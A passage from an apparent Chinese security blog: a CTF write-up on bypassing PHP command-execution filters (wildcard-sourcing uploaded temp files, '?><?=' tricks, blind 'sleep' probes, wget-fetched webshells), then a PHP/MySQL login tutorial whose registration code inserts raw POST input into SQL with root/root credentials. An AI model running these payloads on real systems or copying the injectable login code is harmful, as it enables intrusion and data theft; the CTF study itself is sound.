variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>这个是过滤所有的字母数字<br>这个没有过滤点，就是source命令<br>本地实现<br><img src="https://img-blog.csdnimg.cn/20200913113210942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>shell中是<code>cat flag.php</code><br>有时候需要执行的重复命令过于复杂的话，可以将这些命令写入一个文件，然后使用source命令来执行。<br>之前遇到过这样的思路，在命令执行中如果是对payload的长度进行了限制，那么就可以将这些命令写入到一个文件中，然后使用source命令执行文件中的命令。<br>同时还可以执行<code>. ?????</code>执行这个文件，<br><img src="https://img-blog.csdnimg.cn/20200913114201718.png#pic_center" alt="m0re" loading="lazy"><br>还需要了解的是上传的临时文件，post执行上传，会在系统中产生一个临时文件，这个临时文件的目录一般在<code>/tmp/php??????</code>就是上传的临时文件的文件名会被自动改名为<code>phpxxxxxx</code>PHP后面的六个字母是随机的大小写字母。<br>然后写一个上传页面，本地的。</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://cacec335-d5ef-4934-934d-2524b0e43e62.chall.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--链接是当前打开的题目链接--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>上传一个文件抓包修改，<br><img src="https://img-blog.csdnimg.cn/20200913122629627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>执行命令</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/sh</span><span class="token function">ls</span></code></pre><p><code>[@-[]</code>是匹配linux系统中的大写字母<br>构造poc</p><pre class="language-bash" data-language="bash"><code class="language-bash">?c<span class="token operator">=</span>.+/???/????????<span class="token punctuation">[</span>@-<span class="token punctuation">[</span><span class="token punctuation">]</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200913122251980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后直接cat flag就行了。</p><p><img src="https://img-blog.csdnimg.cn/20200913122349283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>还有一个题，也是类似的，不过有更多过滤，也很有意思。</p><h2 id="CTFshow红包题第二弹"><a href="#CTFshow红包题第二弹" class="headerlink" title="CTFshow红包题第二弹"></a>CTFshow红包题第二弹</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[A-Za-oq-z0-9$]+/"</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cerror"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\'|\"|\:|\,/"</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"serror"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span></code></pre><p>正则过滤了除了小写p以外所有的大写字母和小写字母，还有<code>$和括号</code>之类的特殊符号。<br><code>&lt;?=</code>是echo()的别名用法，不需要开启short_open_tag。<br>用<code>&lt;?=</code>前，。需要先将前面的<code>&lt;?</code>给闭合，<br>所以payload</p><pre class="language-bash" data-language="bash"><code class="language-bash">?cmd<span class="token operator">=</span>?<span class="token operator">></span><span class="token operator">&lt;</span>?<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>.+/??p/p?p??????<span class="token variable">`</span></span><span class="token punctuation">;</span></code></pre><p>然后就是与上一题比较像了，可以任意命令执行。<br>就不在重复了。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> /<span class="token comment">#查看用户根目录的内容，发现flag.txt</span></code></pre><p>直接cat<br><img src="https://img-blog.csdnimg.cn/20200913163804781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h1 id="无回显的命令执行"><a href="#无回显的命令执行" class="headerlink" title="无回显的命令执行"></a>无回显的命令执行</h1><p>命令执行无回显的话，可以尝试下面三种方式</p><ol><li>延时</li><li>http请求</li><li>DNS请求<br>第一种，延时操作，在学习SQL盲注的时候，无回显的情况，可以进行时间盲注，通过延时来反映命令是否执行。<br>同理命令执行也可以。<br>本地搭建环境测试<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><img src="https://img-blog.csdnimg.cn/20200913165738341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>无回显。(提示：在kali中搭建环境，需要开启apache服务)<br><code>?1=ls|sleep 3</code><br><img src="https://img-blog.csdnimg.cn/20200913171511378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>http请求就是通过浏览器，发起请求，判断是否执行。<br>比如可以发起curl请求来查看。</li></ol><p>利用方法<br>写shell(直接写入/外部下载)<br>直接写入就不再多说，关于外部下载，可以在自己服务器上写一个shell，然后放在网站根目录下，开启apache服务。然后执行wget命令，或者其他下载方式把shell下载下来。<br>一个小思路：知道题目中有一个flag.php文件，但是不可读，可以看看能不能使用mv命令，将其变成可读的。因为没有搭建环境，就大概记录一下。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ping<span class="token operator">=</span><span class="token punctuation">;</span>mv flag<span class="token punctuation">.</span>php flag<span class="token punctuation">.</span>txt</code></pre><p>执行过这样的命令后，如果成功的话，就可以直接访问flag.txt进行查看文件中的内容了。<br>这次又学习到命令执行的很多知识。<br>参考博客：<br>P神<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#poc">无字母数字webshell之提高篇</a><br><a href="https://www.gem-love.com/websecurity/1407.html">y1ng师傅</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php+mysql+html+css实现简单的登录注册功能</title>
      <link href="/posts/1de2738/"/>
      <url>/posts/1de2738/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>暑假作业留到现在，emmm，最后那段时间是懒了很多。开学事情比较烦，各种麻烦。这个作业进行总结一下。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>利用phpstudy集成环境进行实现，看下效果<br><img src="https://img-blog.csdnimg.cn/20200907105625286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200907105813367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>将CSS写在一个文件夹中，进行调用比较方便。<br>另外我之前收藏过这样的一个404界面的源码，觉得还不错，就加上了。我将它替换那个忘记密码的功能，因为界面简单，(我也没去学习这个模块，复杂，懒的去看了)所以直接替换了。<br><img src="https://img-blog.csdnimg.cn/2020090711024649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h2><p>注册功能的页面，注册时，需要进行的是连接数据库，然后执行SQL语句，插入数据到指定的表中。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'localhost'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"m0re"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into m0re(username,password,register_time) values('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>',md5('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>'),now())"</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//echo "success";</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>我写的时候，那个限制功能都在HTML中，所以PHP没有太多的设置。不过还是写一下PHP的代码(我的代码里面是没有这些的，因为写进去会出错，因为我的HTML代码的原因，自己写的简单的登录狂就可以使用)</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'register.php'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'用户名不得为空！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'register.php'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'用户名长度不要超过32个字符！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'register.php'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'密码不得少于6位！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'confirm_pw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'register.php'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'两次密码输入不一致！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'vcode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'vcode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'register.php'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'验证码输入错误！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_POST</span><span class="token operator">=</span><span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token double-quoted-string string">"select * from member where username='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'register.php'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'这个用户名已经注册过了，请直接登录'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>验证码：我没加上去，因为操作不好，但是我写一个验证码的代码，可以自行添加</p><pre class="language-php" data-language="php"><code class="language-php">#验证码--m0re--<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$width</span><span class="token operator">=</span><span class="token number">120</span><span class="token punctuation">;</span><span class="token variable">$height</span><span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span><span class="token variable">$string</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token variable">$element</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'d'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'e'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'f'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'g'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'h'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'i'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'j'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'k'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'l'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'m'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'n'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'o'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'p'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'q'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'s'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'t'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'u'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'v'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'w'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'y'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token number">5</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$string</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$element</span><span class="token punctuation">[</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$element</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$img</span><span class="token operator">=</span><span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$color_bg</span><span class="token operator">=</span><span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$color_border</span><span class="token operator">=</span><span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$color_string</span><span class="token operator">=</span><span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagefill</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color_bg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">imagerectangle</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$width</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token 